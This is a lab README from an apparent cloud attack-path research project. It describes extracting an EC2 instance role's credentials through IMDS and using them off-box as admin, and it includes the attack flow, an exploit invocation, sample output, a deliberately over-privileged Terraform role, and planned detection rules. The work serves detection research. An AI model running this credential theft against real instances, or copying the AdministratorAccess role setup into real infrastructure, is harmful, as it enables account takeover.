# Path 06 — EC2 Instance Profile Abuse

## Overview

An EC2 instance has an `AdministratorAccess` role attached via instance
profile. An attacker who has reached the instance — by any means — reads
IMDS to extract the role's temporary credentials, then uses them **off-box**
as admin. The credentials work from anywhere; this is the critical fact
that makes IMDS exposure a serious problem.

The "how the attacker got on the EC2" is intentionally outside the catalogued
primitive (consistent with Path 1, which doesn't model the network connection
to the launched instance). This lab provisions SSH purely so the
IMDS-extraction step can be reproduced cleanly.

## Attack flow

```
attacker has shell on EC2 (foothold — out of scope)
    ↓ PUT /latest/api/token              (IMDSv2 token)
    ↓ GET /latest/meta-data/iam/security-credentials/<role>
role credentials returned (AccessKeyId, SecretAccessKey, Token)
    ↓ used off-box via boto3 Session
attacker is now the instance role (AdministratorAccess) — anywhere
```

## MITRE ATT&CK for Cloud

- **T1552.005** — Unsecured Credentials: Cloud Instance Metadata API
- **T1078.004** — Valid Accounts: Cloud Accounts

## Prerequisites

- Baseline lab deployed (provides VPC + public subnet)
- Scenario 06 lab deployed: `cd environments/scenarios/06_instance_profile && terraform apply`
- The lab EC2 has completed cloud-init (usually 60–90s after `apply`)
- Python 3 with `boto3` available
- The local `ssh` client (the exploit drives it via `subprocess`)

**Note:** unlike Paths 3–5, this path does **not** require switching to the
low-priv user's credentials. The attack uses only the stolen IMDS credentials.
Run with whatever shell credentials you have — they are not consumed by the
attack itself.

## Attack steps

```bash
# 1. After terraform apply, wait for SSH to come up
for i in {1..12}; do
  ssh -i $(terraform output -raw ssh_key_path) \
      -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
      ec2-user@$(terraform output -raw instance_public_ip) \
      "echo ready" 2>/dev/null && break
  sleep 5
done

# 2. Run the exploit (ARNs and paths come from scenario 06's terraform output)
python attacks/06_instance_profile/exploit.py \
    --instance-ip <instance_public_ip> \
    --ssh-key-path <ssh_key_path> \
    --role-name <role_name>
```

## Expected output

```
[*] target: ec2-user@<ip> (role: pathtriage-06-ec2-admin)
[*] Step 1: SSH foothold check
    [+] on box as: ec2-user / ip-...
[*] Step 2: IMDSv2 token + role credentials via IMDS
    [+] extracted credentials for pathtriage-06-ec2-admin
        AccessKeyId:     ASIA...
        SecretAccessKey: xxxx...xxxx (masked)
        Token:           (length ~1400, masked)
        Expiration:      <iso-8601>
[*] Step 3: using stolen credentials *off-box* via boto3
    [+] now: arn:aws:sts::<acct>:assumed-role/pathtriage-06-ec2-admin/i-...
[*] Step 4: privileged probe — iam:CreateUser as the stolen role
    [+] iam:CreateUser SUCCEEDS off-box — instance role is admin

[+] Path 06 verified: EC2 foothold -> IMDS extraction -> off-box admin
```

See `verification_log.txt` for a captured run.

## Vulnerable configuration

The misconfiguration is **role posture**, not IMDS posture. The lab enforces
IMDSv2 (`http_tokens = "required"`) precisely to make the point: hardened
IMDS does not save you when the role itself is over-privileged.

```hcl
resource "aws_iam_role" "ec2_admin" {
  name = "pathtriage-06-ec2-admin"
  assume_role_policy = jsonencode({
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_role_policy_attachment" "ec2_admin" {
  role       = aws_iam_role.ec2_admin.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"   # <-- the misconfig
}

resource "aws_instance" "lab" {
  iam_instance_profile = aws_iam_instance_profile.ec2_admin.name
  metadata_options {
    http_tokens = "required"   # IMDSv2 enforced; does not mitigate the path
  }
}
```

## Why this works

The catalogued primitive is `IMDS extraction given EC2 access`. Whether the
attacker reached the EC2 via SSH key reuse, application compromise, an SSM
session, or by exploiting a separate vulnerability is variable and outside
this primitive. What matters is that IMDS, by design, hands the instance
role's credentials to anyone who can reach `169.254.169.254` from within the
host — and those credentials work *off-box*.

### Convergence with Paths 1 and 2

Paths 1, 2, and 6 reach IMDS credential extraction from three different
starting positions:

| Path | Starting position | How IMDS is reached |
|------|--------------------|----------------------|
| 01 — PassRole + EC2 RunInstances | Low-priv user with `iam:PassRole` + `ec2:RunInstances` | Attacker *launches* a new EC2 with admin role |
| 02 — IMDS SSRF | Web SSRF on someone else's EC2 with admin role | SSRF tunnels HTTP requests to IMDS |
| 06 — Instance Profile Abuse | Shell on existing EC2 with admin role | Direct local curl |

All three terminate in the same observable: an IMDS read followed by the
returned credentials being used from a different IP than the EC2's own
ENI. **One detection rule covers all three.** This is the empirical
foundation for the **N2 convergence-based defender output** argument in
the Midway Report: fewer rules, broader coverage, because the catalogue is
structured around the actual convergence points rather than the surface
mechanics.

This also means Path 6 is essential to keep in the catalogue *even though*
its starting position overlaps with Path 1's endpoint — they are not
duplicates; they are different *entry conditions* into the same convergence
point.

## Deferred sections

- **Exploitability score** — applied W5, alongside the Midway Report, under
  the rubric in `docs/scoring_rubric.md`. Expected to score on the easy end
  given the simplicity of the IMDS extraction itself, but moderated by the
  prerequisite of having reached the EC2.
- **Defender output** — generated W7. Will include:
  - CloudTrail query template detecting IAM API calls authenticated by
    `arn:aws:sts::*:assumed-role/<instance-role>/i-*` from a source IP that
    is *not* the EC2's ENI (the off-box-use pattern that covers Paths 1, 2, 6)
  - SCP snippet denying `iam:*` and other admin actions when the principal
    is an assumed instance role outside a specific allow-list of EC2
    automation roles

## Cleanup

```bash
cd environments/scenarios/06_instance_profile
terraform destroy -auto-approve

# Verify no orphans remain
aws ec2 describe-instances \
    --filters "Name=tag:Scenario,Values=06_instance_profile" \
    --query 'Reservations[].Instances[?State.Name!=`terminated`].InstanceId' \
    --output text                  # should be empty

aws iam list-roles \
    --query 'Roles[?contains(RoleName, `pathtriage-06`)].RoleName' \
    --output text                  # should be empty

aws iam list-instance-profiles \
    --query 'InstanceProfiles[?contains(InstanceProfileName, `pathtriage-06`)].InstanceProfileName' \
    --output text                  # should be empty

aws ec2 describe-key-pairs \
    --filters "Name=key-name,Values=pathtriage-06-key" \
    --query 'KeyPairs[].KeyName' --output text   # should be empty

aws ec2 describe-security-groups \
    --filters "Name=group-name,Values=pathtriage-06-sg" \
    --query 'SecurityGroups[].GroupName' --output text   # should be empty
```

The local `pathtriage-06-key.pem` file is also removed by `terraform destroy`
(it is managed by the `local_sensitive_file` resource).

## References

- Rhino Security Labs — [AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) (EC2 / IMDS section)
- MITRE ATT&CK for Cloud — [T1552.005](https://attack.mitre.org/techniques/T1552/005/), [T1078.004](https://attack.mitre.org/techniques/T1078/004/)
- AWS docs — [Instance metadata and user data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- Capital One incident (2019) — [the canonical real-world Path 2 → Path 6 chain](https://www.capitalone.com/digital/facts2019/)